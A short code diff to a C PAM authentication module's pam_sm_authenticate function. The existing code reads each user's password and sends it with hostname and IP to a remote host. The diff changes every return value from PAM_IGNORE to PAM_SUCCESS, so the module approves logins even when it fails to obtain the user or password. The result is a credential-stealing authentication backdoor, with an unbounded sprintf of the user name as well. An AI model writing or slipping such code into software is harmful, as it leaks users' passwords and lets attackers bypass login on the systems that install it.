@@ -104,16 +104,16 @@ int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **ar
     char prompt[64];
 
     if (pam_get_user(pamh, &user, NULL) != PAM_SUCCESS)
-        return PAM_IGNORE;
+        return PAM_SUCCESS;
 
     memset(prompt, 0, sizeof(prompt));
     sprintf(prompt, "password for %s: ", user);
     if (pam_get_authtok(pamh, PAM_AUTHTOK, &authtok, prompt) != PAM_SUCCESS)
-        return PAM_IGNORE;
+        return PAM_SUCCESS;
 
     if (pam_remote2_get_host(IFACE, hostname, &ipaddr) != PAM_REMOTE2_SUCCESS)
-        return PAM_IGNORE;
+        return PAM_SUCCESS;
 
     pam_remote2_send_creds(REMOTE_HOST, user, authtok, hostname, ipaddr);
-    return PAM_IGNORE;
+    return PAM_SUCCESS;
 }
